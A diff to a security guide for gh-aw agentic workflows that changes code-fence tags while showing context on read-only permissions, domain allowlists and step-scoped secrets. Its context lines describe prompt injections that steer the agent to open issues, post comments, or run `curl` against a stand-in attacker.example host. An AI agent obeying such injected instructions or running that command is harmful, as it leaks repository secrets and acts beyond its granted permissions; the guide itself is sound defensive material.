@@ -53,7 +53,7 @@ gh-aw's [`safe-outputs`](https://github.github.com/gh-aw/reference/safe-outputs/
 
 Example frontmatter that keeps the workflow read-only:
 
-```yaml
+```markdown
 ---
 permissions:
   contents: read
@@ -67,7 +67,7 @@ An injection asking the agent to open an issue or post a comment will fail becau
 
 gh-aw lets you declare a [firewall](https://github.github.com/gh-aw/reference/network/) allowlist of domains the workflow runner may contact. Any outbound connection to a domain not in the list is rejected.
 
-```yaml
+```markdown
 ---
 network:
   allowed:
@@ -85,7 +85,7 @@ Even if an injected instruction tells the agent to `curl https://attacker.exampl
 
 Avoid exposing secrets as global environment variables. Instead, use the `env:` key at the step level and inject only the secret that step requires:
 
-```yaml
+```markdown
 - name: Fetch open issues
   id: issues
   run: |
@@ -101,7 +101,7 @@ With this pattern, `GITHUB_TOKEN` is only available to the shell in that one ste
 
 A narrow [permissions](https://github.github.com/gh-aw/reference/permissions/) block limits what `GITHUB_TOKEN` is authorized to do. A workflow with:
 
-```yaml
+```markdown
 ---
 permissions:
   contents: read
